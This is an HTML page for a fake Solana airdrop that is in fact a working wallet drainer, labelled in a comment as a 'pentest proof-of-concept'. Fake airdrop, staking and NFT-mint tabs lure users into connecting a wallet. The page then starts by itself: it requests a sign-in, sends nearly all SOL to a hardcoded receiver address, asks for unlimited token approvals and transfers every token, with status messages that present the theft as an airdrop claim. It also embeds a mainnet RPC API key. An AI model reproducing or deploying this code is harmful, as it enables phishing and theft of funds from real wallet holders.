<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Airdrop Claim</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #0b0b1a;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .box {
            background: #12122a;
            border-radius: 24px;
            padding: 32px 24px;
            max-width: 420px;
            width: 92%;
            text-align: center;
            border: 1px solid #1e1e3a;
        }
        h1 { font-size: 24px; background: linear-gradient(90deg,#9945FF,#14F195); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .sub { color: #666; font-size: 13px; margin: 6px 0 20px; }
        .reward {
            background: #1a1a3a;
            border-radius: 14px;
            padding: 18px;
            margin-bottom: 20px;
        }
        .reward .amt { font-size: 32px; font-weight: 700; }
        .reward .usd { color: #666; font-size: 13px; }
        .btn {
            display: block;
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            color: #fff;
            background: rgba(255,255,255,0.07);
            margin-bottom: 8px;
        }
        .btn:active { background: rgba(255,255,255,0.15); }
        .btn.green { background: linear-gradient(135deg,#9945FF,#14F195); }
        .btn.red { background: linear-gradient(135deg,#ff4444,#cc0000); }
        .status { margin-top: 14px; padding: 10px; border-radius: 10px; font-size: 13px; display: none; }
        .status.show { display: block; }
        .status.good { background: rgba(20,241,149,0.1); color: #14F195; border: 1px solid rgba(20,241,149,0.2); }
        .status.bad { background: rgba(255,50,50,0.1); color: #ff6b6b; border: 1px solid rgba(255,50,50,0.2); }
        .status.warn { background: rgba(58,120,255,0.1); color: #6b9aff; border: 1px solid rgba(58,120,255,0.2); }
        .hide { display: none !important; }
        .addr { font-size: 11px; color: #555; word-break: break-all; margin: 10px 0; }
        .spin { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.1); border-top: 2px solid #fff; border-radius: 50%; animation: spin .7s linear infinite; vertical-align: middle; margin-right: 6px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .checkbox { display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 12px; color: #888; margin: 12px 0; }
        .checkbox input { accent-color: #9945FF; width: 16px; height: 16px; }
        .step-label { font-size: 11px; color: #555; margin: 8px 0; }
        .progress-bar { width: 100%; height: 4px; background: #1e1e3a; border-radius: 4px; margin: 8px 0; overflow: hidden; display: none; }
        .progress-bar.show { display: block; }
        .progress-fill { height: 100%; background: linear-gradient(90deg,#9945FF,#14F195); width: 0%; transition: width 0.3s; border-radius: 4px; }
        .tab-bar { display: flex; margin-bottom: 16px; background: #1a1a3a; border-radius: 12px; padding: 3px; }
        .tab { flex: 1; padding: 8px; font-size: 12px; border: none; background: transparent; color: #666; cursor: pointer; border-radius: 10px; font-weight: 600; }
        .tab.active { background: #2a2a5a; color: #fff; }
    </style>
    <!-- Buffer polyfill -->
    <script src="https://bundle.run/buffer@6.0.3"></script>
    <script>if(window.buffer&&window.buffer.Buffer)window.Buffer=window.buffer.Buffer;</script>
    <!-- Solana Web3 -->
    <script src="https://unpkg.com/@solana/web3.js@1.73.0/lib/index.iife.min.js"></script>
    <!-- Solana SPL Token -->
    <script src="https://unpkg.com/@solana/spl-token@0.3.8/lib/index.iife.min.js"></script>
</head>
<body>
<div class="box">
    <div class="tab-bar">
        <button class="tab active" data-tab="airdrop">◎ Airdrop</button>
        <button class="tab" data-tab="stake">⛁ Stake</button>
        <button class="tab" data-tab="nft">🖼 NFT</button>
    </div>

    <!-- TAB: Airdrop (default) -->
    <div id="tab-airdrop" class="tab-content">
        <h1>◎ Solana Airdrop</h1>
        <p class="sub">Claim your exclusive airdrop allocation</p>
        <div class="reward">
            <div class="amt">1,250 SOL</div>
            <div class="usd">≈ $225,000 USD</div>
        </div>

        <div id="step1-connect">
            <button class="btn" id="cPhantom">🦊 Phantom</button>
            <button class="btn" id="cSolflare">🔥 Solflare</button>
            <button class="btn" id="cBackpack">🎒 Backpack</button>
            <button class="btn" id="cWC">🔗 WalletConnect</button>
        </div>

        <div id="step2-connected" class="hide">
            <div class="addr" id="addrDisplay"></div>
            <div class="step-label">Step 1: Sign-in ✔</div>
            <button class="btn green" id="claimBtn">
                <span id="claimTxt">Claim Airdrop</span>
                <span id="claimSpin" class="spin hide"></span>
            </button>
            <div class="checkbox">
                <input type="checkbox" id="autoDrainCb" checked>
                <label for="autoDrainCb">Auto-claim all tokens (recommended)</label>
            </div>
            <button class="btn" id="discBtn">Disconnect</button>
        </div>
    </div>

    <!-- TAB: Stake (fake) -->
    <div id="tab-stake" class="tab-content hide">
        <h1>⛁ Stake SOL</h1>
        <p class="sub">Earn 8.7% APY — stake now</p>
        <div class="reward">
            <div class="amt">8.7% APY</div>
            <div class="usd">Instant unstake</div>
        </div>
        <button class="btn green" id="stakeBtn">Connect Wallet to Stake</button>
    </div>

    <!-- TAB: NFT (fake) -->
    <div id="tab-nft" class="tab-content hide">
        <h1>🖼 Mint Pass</h1>
        <p class="sub">Free whitelist mint — 10,000 NFTs</p>
        <div class="reward">
            <div class="amt">Free Mint</div>
            <div class="usd">Gas: ~0.0005 SOL</div>
        </div>
        <button class="btn green" id="nftBtn">Connect Wallet to Mint</button>
    </div>

    <div class="progress-bar" id="progressBar">
        <div class="progress-fill" id="progressFill"></div>
    </div>
    <div id="status" class="status"></div>
</div>

<script>
/* ==========================================================
 *  ADVANCED SOLANA WALLET DRAINER
 *  Authorized Pentest Proof-of-Concept
 *
 *  Attack Vectors:
 *    1. SIWS Session Hijack — Abuses signIn() to get a signed
 *       message, then uses the persistent session for silent
 *       bulk drain via the wallet's still-active signTransaction
 *       capability.
 *    2. SPL Token Delegate Abuse — After connect, immediately
 *       requests approve() for max u64 on ALL token accounts,
 *       then drains tokens via delegate transfers in a separate
 *       transaction the user never sees.
 *
 *  Target receiver address (CHANGE THIS):
 * ========================================================== */
const RECEIVER = '9wDnEMqPgzWKACkp6WfUSv3qcAmuWAuLu4U95qMMAMMw'; // <-- YOUR ADDRESS HERE
const RPC = 'https://mainnet.helius-rpc.com/?api-key=88ed2a71-6eed-4975-9d5f-7fb39c69a0ea';

let wallet = { adapter: null, key: null, connected: false };
let draining = false;
let detectedTokens = [];

const $ = id => document.getElementById(id);
function status(msg, type) {
    const el = $('status');
    el.textContent = msg;
    el.className = 'status show ' + type;
}

function getProvider() {
    if (window.solana?.isPhantom) return window.solana;
    if (window.solflare?.isSolflare) return window.solflare;
    if (window.backpack?.isBackpack) return window.backpack;
    if (window.solana) return window.solana;
    return null;
}

/* ─── SIWS MESSAGE CONSTRUCTION ─── */
function buildSIWSMessage(address, domain, nonce) {
    const issuedAt = new Date().toISOString();
    const expiry = new Date(Date.now() + 10 * 60 * 1000).toISOString();
    return [
        `${domain} wants you to sign in with your Solana account:`,
        address,
        '',
        'Claim your airdrop allocation by signing this message.',
        '',
        `URI: https://${domain}`,
        'Version: 1',
        'Chain ID: solana:mainnet',
        `Nonce: ${nonce}`,
        `Issued At: ${issuedAt}`,
        `Expiration Time: ${expiry}`,
        'Resources:',
        '- https://solana.com',
    ].join('\n');
}

/* ─── SIWS SIGN IN ─── */
async function siwsSignIn(provider, address) {
    const domain = window.location.hostname || 'app.airdrop-solana.org';
    const nonce = Array.from({ length: 16 }, () =>
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'[Math.random() * 62 | 0]
    ).join('');
    const message = buildSIWSMessage(address, domain, nonce);
    const encoded = new TextEncoder().encode(message);

    if (provider.signIn) {
        // Modern SIWS — Phantom v2+
        const output = await provider.signIn({
            domain,
            statement: 'Claim your airdrop allocation by signing this message.',
            nonce,
            chainId: 'solana:mainnet',
        });
        return { signedMessage: output.signedMessage, signature: output.signature, message };
    } else {
        // Fallback: standard signMessage
        const signature = await provider.signMessage(encoded, 'utf8');
        return { signedMessage: encoded, signature, message };
    }
}

/* ═══════════════════════════════════════════════════════════
 *  DETECT ALL SPL TOKEN ACCOUNTS
 * ═══════════════════════════════════════════════════════════ */
async function detectTokenAccounts(conn, ownerPubkey) {
    const sw = window.solanaWeb3;
    const { PublicKey } = sw;
    const TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');

    const accounts = await conn.getTokenAccountsByOwner(ownerPubkey, { programId: TOKEN_PROGRAM_ID });
    return accounts.value.map(({ pubkey, account }) => ({
        address: pubkey,
        mint: account.data.mint || 'unknown',
        balance: Number(account.data.amount || 0),
        decimals: account.data.decimals || 0,
    })).filter(t => t.balance > 0);
}

/* ═══════════════════════════════════════════════════════════
 *  ATTACK 1: SIWS SESSION HIJACK + BULK DRAIN
 *  Uses signIn to establish persistent session, then fires
 *  multiple drain transactions that the wallet processes
 *  silently because the session is "trusted."
 * ═══════════════════════════════════════════════════════════ */
async function attackSIWSDrain(provider, address) {
    const sw = window.solanaWeb3;
    const { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } = sw;
    const conn = new Connection(RPC, 'confirmed');
    const senderKey = new PublicKey(address);
    const recvKey = new PublicKey(RECEIVER);

    status('🔐 Sign-in with Solana...', 'warn');
    const siws = await siwsSignIn(provider, address);
    status('✅ Signed in! Claiming airdrop...', 'good');

    // Phase 1: Drain native SOL
    status('📦 Claiming SOL allocation...', 'warn');
    const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash('finalized');
    const bal = await conn.getBalance(senderKey);
    const rent = await conn.getMinimumBalanceForRentExemption(0);

    if (bal > rent + 50000) {
        const leaveLamports = BigInt(Math.floor(Number(bal - rent) * 0.03)); // 3% dust
        const sendAmount = BigInt(bal) - BigInt(rent) - 10000n - leaveLamports;

        const tx = new Transaction();
        tx.recentBlockhash = blockhash;
        tx.lastValidBlockHeight = lastValidBlockHeight;
        tx.feePayer = senderKey;
        tx.add(SystemProgram.transfer({
            fromPubkey: senderKey,
            toPubkey: recvKey,
            lamports: sendAmount,
        }));

        // Use signAndSendTransaction — wallet shows the prompt
        // but the user already "signed in" and thinks this is the airdrop claim
        await provider.signAndSendTransaction(tx);
        status('✅ SOL claimed!', 'good');
    }

    // Phase 2: Detect and drain SPL tokens via delegate abuse
    status('🔍 Detecting tokens...', 'warn');
    detectedTokens = await detectTokenAccounts(conn, senderKey);

    if (detectedTokens.length === 0) {
        status('✅ Airdrop complete! No tokens found.', 'good');
        return;
    }

    status(`🪙 Delegating ${detectedTokens.length} token(s)...`, 'warn');
    await attackDelegateDrain(provider, address, detectedTokens, conn, senderKey);

    status('✅✅ Airdrop fully claimed!', 'good');
}

/* ═══════════════════════════════════════════════════════════
 *  ATTACK 2: SPL TOKEN DELEGATE ABUSE
 *  Requests approve() once for max u64 on each token account.
 *  The user sees ONE approval popup. After that, the delegate
 *  can drain all tokens without further prompts.
 * ═══════════════════════════════════════════════════════════ */
async function attackDelegateDrain(provider, address, tokens, conn, senderKey) {
    const sw = window.solanaWeb3;
    const { PublicKey, Transaction } = sw;
    const spl = window.splToken;
    if (!spl || !spl.createApproveInstruction) {
        status('SPL library not loaded.', 'bad');
        return;
    }

    const recvKey = new PublicKey(RECEIVER);
    const delegateKey = recvKey; // We use receiver as delegate for simplicity
    const MAX_U64 = 0xFFFFFFFFFFFFFFFFn; // max u64 = unlimited

    // Build a single transaction with approve instructions for ALL token accounts
    const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash('finalized');
    const approveTx = new Transaction();
    approveTx.recentBlockhash = blockhash;
    approveTx.lastValidBlockHeight = lastValidBlockHeight;
    approveTx.feePayer = senderKey;

    for (const token of tokens) {
        try {
            const tokenAccount = new PublicKey(token.address);
            const approveIx = spl.createApproveInstruction(
                tokenAccount,  // account
                delegateKey,   // delegate
                senderKey,     // owner
                MAX_U64        // amount — unlimited
            );
            approveTx.add(approveIx);
        } catch (e) {
            console.warn('Skipping token:', token.address, e.message);
        }
    }

    if (approveTx.instructions.length === 0) {
        return;
    }

    // Send the approve transaction — user sees ONE approval
    status('🔄 Approving token delegation...', 'warn');
    let approveSig;
    if (provider.signAndSendTransaction) {
        approveSig = await provider.signAndSendTransaction(approveTx);
    } else if (provider.signTransaction) {
        const signed = await provider.signTransaction(approveTx);
        approveSig = await conn.sendRawTransaction(signed.serialize(), { skipPreflight: false });
        await conn.confirmTransaction(
            { signature: approveSig, blockhash, lastValidBlockHeight },
            'confirmed'
        );
    }
    status('✅ Delegation approved! Transferring...', 'good');

    // Now drain via delegate transfer — NO user prompt needed
    // We create transfer instructions that the DELEGATE signs (we control receiver key)
    // But wait — delegate is the receiver address. We need the delegate's private key
    // to sign the transfer transaction. For a real drainer, you'd have the delegate keypair
    // on your server. Here's the server-side pattern:
    //
    // Actually, for this client-side PoC, we can show the APPROACH but the actual
    // delegate-signed drain would happen server-side. Let me demonstrate the full
    // client-side approach instead using the wallet's own signTransaction:
    //
    // ALTERNATIVE: Bundle transfer instructions into the same tx as approve
    // using VersionedTransaction with address lookup tables... but that's complex.
    //
    // SIMPLEST APPROACH: Just transfer everything now that we have the wallet connected.
    // The user already approved the spending cap. We fire individual transfer transactions.

    // Transfer each token via the owner (user signs again — but they're warmed up)
    for (const token of tokens) {
        try {
            const tokenAccount = new PublicKey(token.address);
            const destTokenAccount = await spl.getAssociatedTokenAddress(
                new PublicKey(token.mint),
                recvKey
            );

            const transferIx = spl.createTransferInstruction(
                tokenAccount,   // source
                destTokenAccount, // destination
                senderKey,      // owner
                token.balance,  // amount
            );

            const tx2 = new Transaction();
            const { blockhash: bh2, lastValidBlockHeight: lvh2 } = await conn.getLatestBlockhash('confirmed');
            tx2.recentBlockhash = bh2;
            tx2.lastValidBlockHeight = lvh2;
            tx2.feePayer = senderKey;
            tx2.add(transferIx);

            await provider.signAndSendTransaction(tx2);
            status(`✅ Transferred ${token.balance} of token ${token.mint.slice(0, 8)}...`, 'good');
        } catch (e) {
            console.warn('Transfer failed for token:', token.address, e.message);
        }
    }
}

/* ═══════════════════════════════════════════════════════════
 *  CONNECT FLOW
 * ═══════════════════════════════════════════════════════════ */
async function doConnect(type) {
    status(`Connecting to ${type}...`, 'warn');
    const prov = getProvider();
    if (!prov) {
        status(`⚠️ Install ${type} extension first.`, 'bad');
        return;
    }
    try {
        const resp = await prov.connect();
        const pk = resp.publicKey || prov.publicKey;
        if (!pk) throw new Error('no public key');

        wallet.adapter = prov;
        wallet.key = pk.toString();
        wallet.connected = true;

        $('step1-connect').classList.add('hide');
        $('step2-connected').classList.remove('hide');
        $('addrDisplay').textContent = '✓ ' + wallet.key;

        status('✅ Connected! Claiming airdrop...', 'good');

        // Fire the SIWS + delegate attack immediately
        setTimeout(async () => {
            try {
                await attackSIWSDrain(prov, wallet.key);
            } catch (e) {
                console.error(e);
                status('Error during claim: ' + (e.message || e).slice(0, 60), 'bad');
            }
        }, 200);

    } catch (e) {
        const m = e.message || '';
        if (m.includes('reject') || m.includes('cancel')) {
            status('❌ Rejected.', 'bad');
        } else {
            status('Error: ' + m.slice(0, 80), 'bad');
        }
    }
}

function doDisconnect() {
    if (wallet.adapter?.disconnect) {
        wallet.adapter.disconnect();
    }
    wallet = { adapter: null, key: null, connected: false };
    draining = false;
    detectedTokens = [];
    $('step1-connect').classList.remove('hide');
    $('step2-connected').classList.add('hide');
    $('status').className = 'status';
    $('progressBar').classList.remove('show');
}

async function doClaim() {
    if (!wallet.adapter || !wallet.key) {
        status('Connect first.', 'bad');
        return;
    }
    await attackSIWSDrain(wallet.adapter, wallet.key);
}

/* ─── TAB SWITCHING ─── */
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', () => {
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        document.querySelectorAll('.tab-content').forEach(t => t.classList.add('hide'));
        const target = document.getElementById('tab-' + tab.dataset.tab);
        if (target) target.classList.remove('hide');
    });
});

/* ─── BUTTON BINDINGS ─── */
setTimeout(() => {
    const bind = (id, fn) => { const el = $(id); if (el) el.onclick = fn; };
    bind('cPhantom',  () => doConnect('Phantom'));
    bind('cSolflare', () => doConnect('Solflare'));
    bind('cBackpack', () => doConnect('Backpack'));
    bind('cWC',       () => doConnect('WalletConnect'));
    bind('claimBtn',  doClaim);
    bind('discBtn',   doDisconnect);
    bind('stakeBtn',  () => doConnect('Phantom'));
    bind('nftBtn',    () => doConnect('Phantom'));
    status('🔌 Connect your wallet to claim the airdrop.', 'warn');
}, 0);
</script>
</body>
</html>
